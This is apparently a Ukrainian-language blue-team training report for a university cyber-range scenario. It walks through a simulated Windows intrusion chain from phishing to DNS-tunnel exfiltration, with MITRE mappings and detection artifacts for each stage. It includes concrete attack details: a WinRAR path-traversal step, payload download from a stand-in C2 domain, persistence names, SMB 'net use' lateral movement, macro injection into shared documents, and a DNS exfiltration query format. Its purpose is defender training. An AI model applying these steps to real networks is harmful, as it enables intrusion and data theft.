# SC-004 MUDDYWATER — Windows Attack Chain Report
## CyberRanges Blue Team Training | SET University
### EXERCISE ONLY — заборонено використовувати поза навчальним середовищем

---

## 1. ІНФРАСТРУКТУРА

### Атакуючий
| Роль | Host / IP | Опис |
|------|-----------|------|
| DNS C2 + HTTP сервер | NS1 / 172.16.50.10 | Роздає implant.rar, implant_drop.rar; приймає DNS beacons та ексфільтрацію |
| C2 домен | updates-gov.net | Маскується під урядовий домен оновлень |

### Мережа жертви
| Хост | IP | OS | Роль | Користувач |
|------|----|----|------|------------|
| MAIL-01 | 172.16.4.10 | Windows Server | Корпоративний Mail сервер | — |
| WS-1 | 192.168.210.101 | Windows 10 | Фінансова робоча станція | k.johnson |
| WS-2 | 192.168.210.102 | Windows 10 | Фінансовий нагляд | e.brown |
| WS-3 | 192.168.210.103 | Windows 10 | Координація постачальників | l.wilson |
| FILES-01 | 10.10.10.30 | Windows Server | Центральний файловий сервер | — |
| DC01 | 10.10.10.10 | Windows Server | Domain Controller | — |

---

## 2. ID 1 — Initial Access: Phishing Email Delivery (0m)

**Inject:** `A01_Phishing_Email_Delivery`

**Дія:** Атакуючий надсилає фішинговий email від імені внутрішнього урядового контакту через MAIL-01 (172.16.4.10) на адресу `k.johnson@gov.local`.

**Вкладення:** Шкідливий WinRAR архів з урядовою тематикою — містить:
- `implant.ps1` — прихований payload (з CVE-2025-8088 потрапляє в Startup автоматично)
- Office документ з VBA macro — резервний шлях якщо CVE не спрацює

**Чому MAIL-01:**
- Email надходить з **внутрішнього** корпоративного сервера → жертва довіряє
- Відправник виглядає як колега або IT відділ
- SPF/DKIM перевірки проходять (внутрішня відправка)

**Артефакти для Blue Team:**
- MAIL-01 логи: нетипова відправка / спуфінг відправника
- Email gateway: вкладення типу `.rar` від незнайомого внутрішнього відправника
- Wazuh: новий процес wscript.exe / powershell.exe ініційований з email клієнта
- MITRE: T1566.001 (Phishing: Spearphishing Attachment)

---

## 3. ID 2 — Initial Access / Execution: Archive Opened CVE Exploit (45m)

**Inject:** `A02_Archive_Opened_CVE_Exploit`

**Дія:** k.johnson відкриває шкідливий WinRAR архів на WS-1, спрацьовує CVE-2025-8088.

**Вразливість:** CVE-2025-8088 — WinRAR 7.10 Path Traversal

**Механізм:**
```
Архів містить запис з NTFS alternate-data-stream шляхом:
  ..\..\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\implant.ps1

WinRAR 7.10 не валідує шлях → розпаковує implant.ps1 ПОЗА цільовою папкою
→ implant.ps1 автоматично потрапляє в Startup k.johnson
→ При наступному логоні → автоматичне виконання (без кліку жертви)
```

**Резервний шлях (якщо CVE не спрацює):**
- Жертва відкриває Office документ з архіву
- VBA macro `AutoOpen` спрацьовує → перевіряє Startup
- Якщо `implant.ps1` нема → завантажує `implant_drop.rar` з NS1 → розпаковує в Startup

**Результат:** `implant.ps1` в `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\`

**Артефакти для Blue Team:**
- Sysmon EID 11: новий файл `implant.ps1` у Startup папці
- Sysmon EID 1: `WinRAR.exe` з незвичайним шляхом виводу
- Wazuh FIM: зміна у Startup директорії
- MITRE: T1204.002 (User Execution: Malicious File), T1105 (Ingress Tool Transfer)

---

## 4. ID 3 — Execution: PowerShell Implant Foothold (50m)

**Inject:** `A03_PowerShell_Implant_Foothold`

**Дія:** k.johnson логується в систему → `implant.ps1` автоматично запускається з Startup.

**Що робить implant.ps1:**
1. Завантажує `http://updates-gov.net/implant.rar` → `%TEMP%\implant.rar`
2. Знаходить WinRAR → розпаковує всі блоки атаки в `%TEMP%\wupd\`
3. Запускає `block1_persist.ps1` — головний оркестратор ланцюга
4. Видаляє `implant.rar`
5. Відкриває C2 канал через DNS beacons до `updates-gov.net`

**Результат:** Атакуючий отримує hands-on-keyboard доступ до WS-1 через DNS C2

**Артефакти для Blue Team:**
- Sysmon EID 1: `powershell.exe -WindowStyle Hidden` запущений з Startup
- Sysmon EID 3: HTTP GET до `updates-gov.net` (порт 80)
- Sysmon EID 1: `WinRAR.exe -ibck` розпаковка в `%TEMP%\wupd\`
- Zeek/Arkime: HTTP download `implant.rar` з зовнішнього IP
- MITRE: T1059.001 (PowerShell), T1547.001 (Startup Folder)

---

## 5. ID 4 — Persistence: Scheduled Task + Run Key (55m)

**Inject:** `A04_Persistence_ScheduledTask_RunKey`

**Дія:** `block1_persist.ps1` встановлює стійкий доступ каскадним методом.

**Методи persistence (fallback):**
| Пріоритет | Метод | Ключ / Шлях |
|-----------|-------|-------------|
| 1 | Scheduled Task | `WindowsUpdateCheck` (ONLOGON trigger) |
| 2 | HKCU Run key | `SecurityHealthUpdater` → `WinSecUpdate.bat` |
| 3 | Startup folder | `WinSecUpdate.bat` у Startup |

**Infection marker:** `C:\Windows\Temp\wsu.lock` — запобігає повторному зараженню

**Постійний запуск:** `WinSecUpdate.bat` → `block1_persist.ps1` при кожному логоні k.johnson

**Артефакти для Blue Team:**
- Sysmon EID 1: `schtasks.exe /create` з параметром `/sc onlogon`
- Sysmon EID 13: новий HKCU Run key `SecurityHealthUpdater`
- Sysmon EID 11: `WinSecUpdate.bat` у Startup папці
- Wazuh: новий Scheduled Task, зміна Run key
- MITRE: T1053.005 (Scheduled Task), T1547.001 (Registry Run Keys / Startup Folder)

---

## 6. ID 5 — Credential Access: Credential Harvest (1h 10m)

**Inject:** `A05_Credential_Harvest`

**Дія:** `block2_discovery.ps1` збирає системну інформацію та credentials з WS-1.

**Що збирається:**
- `sysinfo.txt` — hostname, IP, користувачі, процеси, мережа, маршрути
- `passwords.csv` — plaintext credentials (Desktop/Documents/Downloads)
- Windows Credential Manager — збережені credentials
- Шляхи браузерів Chrome/Edge до збережених паролів

**Ключові credentials з `passwords.csv`:**
```
k.johnson / [password]   ← поточна жертва
e.brown   / [password]   ← WS-2 Finance Supervision
l.wilson  / [password]   ← WS-3 Supplier Coordination
```

**Де зберігається:** `C:\ProgramData\upd_logs\creds\`

**Артефакти для Blue Team:**
- Sysmon EID 1: `whoami.exe`, `net.exe user`, `ipconfig.exe`, `systeminfo.exe`
- Sysmon EID 11: нові файли в `C:\ProgramData\upd_logs\`
- Wazuh: доступ до файлів у Desktop/Documents з PowerShell процесу
- MITRE: T1082, T1033, T1057, T1049, T1555, T1003

---

## 7. ID 6 — Lateral Movement: WS-2 + WS-3 (1h 30m)

**Inject:** `A06_Lateral_Movement_WS2_WS3`

**Дія:** `block6_lateral.ps1` використовує зібрані credentials для підключення до WS-2 та WS-3 через SMB.

**Цілі:**
| Хост | IP | Credentials | Роль |
|------|----|-------------|------|
| WS-2 | 192.168.210.102 | e.brown | Finance Supervision |
| WS-3 | 192.168.210.103 | l.wilson | Supplier Coordination |

**Механізм:**
```
WS-1 → net use \\WS-2\C$ /user:e.brown [password]
     → копіює block-скрипти в \\WS-2\C$\Windows\Temp\
     → WinSecUpdate.bat у Startup всіх профілів WS-2
     → wsu.lock маркер на WS-2

WS-1 → net use \\WS-3\C$ /user:l.wilson [password]
     → копіює block-скрипти в \\WS-3\C$\Windows\Temp\
     → WinSecUpdate.bat у Startup всіх профілів WS-3
     → wsu.lock маркер на WS-3
```

**WS-3 особливість:** Залишається тільки як pivot (lateral movement) — збір документів з WS-3 не виконується.

**Артефакти для Blue Team:**
- Wazuh EID 4624: Logon Type 3 (Network) на WS-2 та WS-3 з IP WS-1
- Wazuh EID 4648: Explicit credentials (чужий акаунт)
- Wazuh EID 5145: доступ до `C$` share
- Sysmon EID 3: TCP/445 WS-1 → WS-2, WS-1 → WS-3
- Sysmon EID 11: `WinSecUpdate.bat` у Startup WS-2 та WS-3
- MITRE: T1021.002 (SMB), T1078 (Valid Accounts), T1547.001

---

## 8. ID 7 — Collection: Workstations WS-1 + WS-2 (2h 0m)

**Inject:** `A07_Collection_Workstations`

**Дія:** Збір фінансових документів з WS-1 та WS-2.

**WS-1 (локально — block2):**
- Пошук у Desktop, Documents, Downloads
- Фільтр за назвою: `*budget*`, `*finance*`, `*payment*`, `*invoice*`, `*salary*`, `*payroll*`, `*contract*`, `*approval*`, `*report*`
- Формати: `.docx`, `.xlsx`, `.pdf`, `.csv`
- Зберігається в: `C:\ProgramData\upd_logs\docs\ws1\`

**WS-2 (через SMB — block6):**
- Підключення через `\\WS-2\C$` (e.brown credentials)
- Пошук у `C:\Users\e.brown\Desktop`, `Documents`, `Downloads`
- Finance Supervision документи: бюджети, звіти затвердження
- Зберігається в: `C:\ProgramData\upd_logs\docs\ws2\`

**WS-3:** Без збору документів — тільки lateral movement pivot.

**Артефакти для Blue Team:**
- Sysmon EID 11: нові файли копіюються в `C:\ProgramData\upd_logs\docs\`
- Sysmon EID 3: SMB читання файлів з WS-2 (не тільки адмін-операції)
- Wazuh FIM: масовий read доступ до документів у Documents/Desktop
- MITRE: T1005 (Data from Local System), T1039 (Data from Network Shared Drive)

---

## 9. ID 8 — Collection: File Server FILES-01 (2h 30m)

**Inject:** `A08_Collection_FileServer`

**Дія:** `block7_fileserver.ps1` підключається до `\\FILES-01\public_folder` та збирає всі доступні документи.

**Цільова шара:** `\\FILES-01\public_folder` (10.10.10.30)
- Публічна шара — доступна всім domain users
- Містить фінансові документи, шаблони, звіти

**Збір файлів:**
- Формати: `.docx`, `.xlsx`, `.pdf`, `.xls`, `.doc`
- Всі файли без фільтру по назві (все що в шарі — цікаво)
- Зберігається в: `C:\ProgramData\upd_logs\docs\fileserver\`

**Додатково (якщо MS Office встановлений):**
- Macro injection у `.docx` → `.docm` з `AutoOpen` macro
- Macro injection у `.xlsx` → `.xlsm` з `Auto_Open` macro
- При відкритті будь-яким користувачем → повторне зараження

**Fallback (якщо Office не встановлений):**
- Кладе `WindowsSecurityUpdate.vbs` у шару
- Маркер `.winsec` у шарі щоб не обробляти повторно

**Артефакти для Blue Team:**
- Sysmon EID 3: масове TCP/445 WS-1 → FILES-01
- Sysmon EID 11: нові `.docm`/`.xlsm` файли у мережевій шарі
- Sysmon EID 1: `winword.exe` / `excel.exe` з parent `powershell.exe`
- Wazuh EID 5145: масовий read доступ до `public_folder`
- MITRE: T1039, T1137 (Office Macro), T1105

---

## 10. ID 9 — Collection / Staging: Archive (3h 0m)

**Inject:** `A09_Archive_Staging`

**Дія:** `block4_staging.ps1` пакує всі зібрані матеріали в один зашифрований архів.

**Що входить в архів:**
| Джерело | Вміст |
|---------|-------|
| `sysinfo.txt` | Системна інформація WS-1 |
| `creds\` | Credential файли (passwords.csv та ін.) |
| `hosts.txt` | Результати мережевого сканування |
| `docs\ws1\` | Фінансові документи з WS-1 |
| `docs\ws2\` | Фінансові документи з WS-2 |
| `docs\fileserver\` | Документи з FILES-01 |

**Архівування:**
- Пріоритет: 7-Zip з паролем `Upd@te2024!` та шифруванням заголовків (`-mhe=on`)
- Fallback: PowerShell `Compress-Archive` (без пароля)
- Результат: `C:\ProgramData\WinUpd_<random>.zip`
- Шлях до архіву → `stage_path.txt` для block5

**Артефакти для Blue Team:**
- Sysmon EID 1: `7z.exe a -tzip -p...` з параметрами шифрування
- Sysmon EID 11: новий `.zip` файл у `C:\ProgramData\`
- Wazuh FIM: зміна у `C:\ProgramData\`
- MITRE: T1560.001 (Archive via Utility)

---

## 11. ID 10 — C2 / Exfiltration: DNS Tunnel (3h 30m)

**Inject:** `A10_DNS_Tunnel_C2_Exfil`

**Дія:** `block5_exfil.ps1` ексфільтрує архів через DNS tunnel до NS1.updates-gov.net (172.16.50.10).

**Механізм DNS exfiltration:**
```
Архів → HEX encoding → розбивка на chunks по 30 байт

DNS запит: <seq>.<hex_chunk>.exfil.updates-gov.net

Приклад:
  0000.<META:WS-1:k.johnson:181:5432>.exfil.updates-gov.net  ← metadata
  0001.4d5a9000.exfil.updates-gov.net                        ← chunk 1
  0002.03000000.exfil.updates-gov.net                        ← chunk 2
  ...
  0181.00000000.exfil.updates-gov.net                        ← chunk 181
```

**Чому DNS:**
- DNS трафік рідко блокується на периметрі
- Зливається із звичайним DNS шумом
- Firewall бачить тільки UDP/53 до зовнішнього DNS сервера

**C2 сервер (NS1):**
- Приймає DNS запити
- Reassembles chunks у вихідний ZIP файл
- Зберігає у `./received/exfil_<IP>_<timestamp>.zip`

**Параметри:**
- ~181 chunk для типового архіву
- 100ms між запитами → ~20 секунд на повну ексфільтрацію
- DNS beacon після кожного блоку

**Артефакти для Blue Team:**
- Sysmon EID 22: сотні DNS запитів до `*.exfil.updates-gov.net` за 20 секунд
- Zeek DNS: незвичайна кількість запитів до одного домену
- Arkime: DNS query burst pattern
- Wazuh: DNS anomaly rule
- MITRE: T1048.003 (Exfil Over DNS), T1071.004 (DNS C2)

---

## 12. ПОВНА TIMELINE

```
0m       ID 1  — Phishing email → k.johnson отримує WinRAR архів
45m      ID 2  — k.johnson відкриває архів → CVE-2025-8088
                 implant.ps1 → Startup (автоматично, без дії жертви)
                 [якщо CVE не спрацювало → macro → implant.ps1 в Startup]
50m      ID 3  — Логон k.johnson → implant.ps1 запускається
                 → завантажує implant.rar → block1 → C2 online
55m      ID 4  — B1: Schtask + Run key + Startup bat persistence
1h 10m   ID 5  — B2: sysinfo + credentials + finance docs з WS-1
1h 30m   ID 6  — B3: network scan → B6: WS-2 (e.brown) + WS-3 (l.wilson) PWNED
2h 0m    ID 7  — B2/B6: фінансові документи з WS-1 та WS-2
2h 30m   ID 8  — B7: збір документів з FILES-01 + macro/VBS injection
3h 0m    ID 9  — B4: всі матеріали → зашифрований ZIP архів
3h 30m   ID 10 — B5: DNS exfil → архів на NS1 (172.16.50.10)
```

---

## 13. MITRE ATT&CK MAPPING

| ID | Назва | MSEL Event |
|----|-------|------------|
| T1566.001 | Phishing: Spearphishing Attachment | ID 1 |
| T1204.002 | User Execution: Malicious File | ID 2 |
| T1105 | Ingress Tool Transfer | ID 2, ID 3, ID 8 |
| T1059.001 | Command and Scripting: PowerShell | ID 3 |
| T1059.005 | Command and Scripting: VBScript | ID 2 (fallback macro) |
| T1547.001 | Boot or Logon Autostart: Startup Folder | ID 2, ID 4 |
| T1053.005 | Scheduled Task | ID 4 |
| T1112 | Modify Registry (HKCU Run key) | ID 4 |
| T1082 | System Information Discovery | ID 5 |
| T1033 | System Owner/User Discovery | ID 5 |
| T1057 | Process Discovery | ID 5 |
| T1049 | System Network Connections Discovery | ID 5 |
| T1555 | Credentials from Password Stores | ID 5 |
| T1046 | Network Service Scanning | ID 6 (B3 before B6) |
| T1018 | Remote System Discovery | ID 6 (B3) |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | ID 6 |
| T1078 | Valid Accounts | ID 6 |
| T1005 | Data from Local System | ID 7 |
| T1039 | Data from Network Shared Drive | ID 7, ID 8 |
| T1137 | Office Application Startup (Macro) | ID 8 |
| T1560.001 | Archive Collected Data: Archive via Utility | ID 9 |
| T1048.003 | Exfiltration Over Alternative Protocol: DNS | ID 10 |
| T1071.004 | Application Layer Protocol: DNS | ID 10 |

---

*Звіт підготовлено для навчального сценарію SC-004 MUDDYWATER*
*SET University CyberRanges Blue Team Training*
*Код реалізації: block1_persist.ps1 → block7_fileserver.ps1*
